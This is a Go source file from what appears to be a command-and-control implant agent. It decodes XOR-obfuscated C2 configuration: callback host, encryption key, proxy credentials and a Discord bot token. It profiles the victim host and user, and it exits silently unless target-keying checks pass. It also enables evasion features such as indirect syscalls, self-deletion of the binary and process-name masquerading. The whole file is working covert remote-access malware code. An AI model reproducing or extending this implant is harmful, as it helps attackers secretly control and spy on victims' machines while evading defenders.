package main

import (
	"encoding/base64"
	"io"
	"log"
	"net"
	"os"
	"regexp"
	"runtime"
	"strconv"
	"time"

	"github.com/google/uuid"

	"fawkes/pkg/structs"
)

// parsedConfig holds typed values derived from the build-time string globals.
type parsedConfig struct {
	callbackPort     int
	sleepInterval    int
	jitter           int
	killDate         int64
	maxRetries       int
	httpTimeout      int
	recoverySeconds  int // Seconds between recovery attempts for unhealthy C2 domains
	debug            bool
	whStartMinutes   int
	whEndMinutes     int
	whDays           []int
}

// deobfuscateConfig XOR-decodes C2 config strings using the build-time key.
func deobfuscateConfig() {
	if xorKey == "" {
		return
	}
	keyBytes, err := base64.StdEncoding.DecodeString(xorKey)
	if err != nil || len(keyBytes) == 0 {
		return
	}
	payloadUUID = xorDecodeString(payloadUUID, keyBytes)
	callbackHost = xorDecodeString(callbackHost, keyBytes)
	callbackPort = xorDecodeString(callbackPort, keyBytes)
	userAgent = xorDecodeString(userAgent, keyBytes)
	userAgentPool = xorDecodeString(userAgentPool, keyBytes)
	encryptionKey = xorDecodeString(encryptionKey, keyBytes)
	getURI = xorDecodeString(getURI, keyBytes)
	postURI = xorDecodeString(postURI, keyBytes)
	hostHeader = xorDecodeString(hostHeader, keyBytes)
	proxyURL = xorDecodeString(proxyURL, keyBytes)
	proxyUser = xorDecodeString(proxyUser, keyBytes)
	proxyPass = xorDecodeString(proxyPass, keyBytes)
	customHeaders = xorDecodeString(customHeaders, keyBytes)
	fallbackHosts = xorDecodeString(fallbackHosts, keyBytes)
	contentTypes = xorDecodeString(contentTypes, keyBytes)
	trafficProfile = xorDecodeString(trafficProfile, keyBytes)
	discordBotToken = xorDecodeString(discordBotToken, keyBytes)
	discordChannelID = xorDecodeString(discordChannelID, keyBytes)
	httpxConfig = xorDecodeString(httpxConfig, keyBytes)
	httpxDomains = xorDecodeString(httpxDomains, keyBytes)
	mtlsCertPEM = xorDecodeString(mtlsCertPEM, keyBytes)
	mtlsKeyPEM = xorDecodeString(mtlsKeyPEM, keyBytes)
	// Zero the XOR key — no longer needed after deobfuscation
	zeroBytes(keyBytes)
}

// parseConfigValues converts string build variables to typed values with validation.
func parseConfigValues() parsedConfig {
	cfg := parsedConfig{}

	var err error
	cfg.callbackPort, err = strconv.Atoi(callbackPort)
	if err != nil {
		log.Printf("cfg: port=%q fallback=443", callbackPort)
		cfg.callbackPort = 443
	}
	cfg.sleepInterval, err = strconv.Atoi(sleepInterval)
	if err != nil || cfg.sleepInterval < 0 {
		log.Printf("cfg: interval=%q fallback=10", sleepInterval)
		cfg.sleepInterval = 10
	}
	cfg.jitter, err = strconv.Atoi(jitter)
	if err != nil || cfg.jitter < 0 || cfg.jitter > 100 {
		log.Printf("cfg: jitter=%q fallback=10", jitter)
		cfg.jitter = 10
	}
	cfg.killDate, err = strconv.ParseInt(killDate, 10, 64)
	if err != nil {
		log.Printf("cfg: expiry=%q fallback=0", killDate)
		cfg.killDate = 0
	}
	cfg.maxRetries, err = strconv.Atoi(maxRetries)
	if err != nil || cfg.maxRetries < 0 {
		log.Printf("cfg: retries=%q fallback=10", maxRetries)
		cfg.maxRetries = 10
	}
	cfg.httpTimeout, err = strconv.Atoi(httpTimeout)
	if err != nil || cfg.httpTimeout <= 0 {
		cfg.httpTimeout = 30
	}
	cfg.debug, err = strconv.ParseBool(debug)
	if err != nil {
		cfg.debug = false
	}
	cfg.recoverySeconds, err = strconv.Atoi(recoveryInterval)
	if err != nil || cfg.recoverySeconds <= 0 {
		cfg.recoverySeconds = 600 // 10 minutes default
	}

	// Parse working hours
	if workingHoursStart != "" {
		if parsed, err := structs.ParseWorkingHoursTime(workingHoursStart); err != nil {
			log.Printf("cfg: sched start=%q: %v", workingHoursStart, err)
		} else {
			cfg.whStartMinutes = parsed
		}
	}
	if workingHoursEnd != "" {
		if parsed, err := structs.ParseWorkingHoursTime(workingHoursEnd); err != nil {
			log.Printf("cfg: sched end=%q: %v", workingHoursEnd, err)
		} else {
			cfg.whEndMinutes = parsed
		}
	}
	if workingDays != "" {
		if parsed, err := structs.ParseWorkingDays(workingDays); err != nil {
			log.Printf("cfg: sched days=%q: %v", workingDays, err)
		} else {
			cfg.whDays = parsed
		}
	}

	return cfg
}

// setupLogging configures log output based on debug mode.
func setupLogging(debugMode bool) {
	if debugMode {
		log.SetOutput(os.Stdout)
	} else {
		log.SetOutput(io.Discard)
	}
}

// validateConfig checks required configuration and environment keys.
// Returns false if the agent should exit silently.
func validateConfig(cfg parsedConfig) bool {
	if payloadUUID == "" {
		payloadUUID = uuid.New().String()
		log.Printf("cfg: generated id=%s", payloadUUID)
	}

	// Check kill date
	if cfg.killDate > 0 && time.Now().Unix() > cfg.killDate {
		log.Printf("expired, exiting")
		return false
	}

	// Check environment keys — exit silently if any check fails
	if !checkEnvironmentKeys() {
		return false
	}

	return true
}

// initializeAgent creates the Agent struct from parsed config and system info.
func initializeAgent(cfg parsedConfig) *structs.Agent {
	a := &structs.Agent{
		PayloadUUID:       payloadUUID,
		Architecture:      runtime.GOARCH,
		Domain:            "",
		ExternalIP:        "",
		Host:              getHostname(),
		Integrity:         getIntegrityLevel(),
		InternalIP:        getInternalIP(),
		OS:                getOperatingSystem(),
		PID:               os.Getpid(),
		ProcessName:       os.Args[0],
		SleepInterval:     cfg.sleepInterval,
		Jitter:            cfg.jitter,
		User:              getUsername(),
		Description:       payloadUUID[:8],
		KillDate:          cfg.killDate,
		WorkingHoursStart: cfg.whStartMinutes,
		WorkingHoursEnd:   cfg.whEndMinutes,
		WorkingDays:       cfg.whDays,
	}
	if jitterProfile != "" {
		a.JitterProfile = jitterProfile
	}
	return a
}

// applySecurity runs startup security patches based on build-time flags.
func applySecurity() {
	if autoPatch == "true" {
		autoStartupPatch()
	}
	if indirectSyscalls == "true" {
		initIndirectSyscalls()
	}
	if selfDelete == "true" {
		selfDeleteBinary()
	}
	if masqueradeName != "" {
		masqueradeProcess(masqueradeName)
	}
}

// Helper functions for system information

func getHostname() string {
	if hostname, err := os.Hostname(); err == nil {
		return hostname
	}
	return "unknown"
}

func getUsername() string {
	if user := os.Getenv("USER"); user != "" {
		return user
	}
	if user := os.Getenv("USERNAME"); user != "" {
		return user
	}
	return "unknown"
}

func getOperatingSystem() string {
	return runtime.GOOS
}

func getInternalIP() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "127.0.0.1"
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
			continue
		}
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			if ip4 := ip.To4(); ip4 != nil {
				return ip4.String()
			}
		}
	}
	return "127.0.0.1"
}

// checkEnvironmentKeys validates all configured environment keys.
// Returns true if all checks pass (or no keys configured).
func checkEnvironmentKeys() bool {
	if envKeyHostname != "" {
		hostname, _ := os.Hostname()
		if !regexMatch(envKeyHostname, hostname) {
			return false
		}
	}
	if envKeyDomain != "" {
		domain := getEnvironmentDomain()
		if !regexMatch(envKeyDomain, domain) {
			return false
		}
	}
	if envKeyUsername != "" {
		username := getUsername()
		if !regexMatch(envKeyUsername, username) {
			return false
		}
	}
	if envKeyProcess != "" {
		if !isProcessRunning(envKeyProcess) {
			return false
		}
	}
	return true
}

// regexMatch performs a case-insensitive full-string regex match.
func regexMatch(pattern, value string) bool {
	anchored := "(?i)^(?:" + pattern + ")$"
	re, err := regexp.Compile(anchored)
	if err != nil {
		return false // fail closed
	}
	return re.MatchString(value)
}

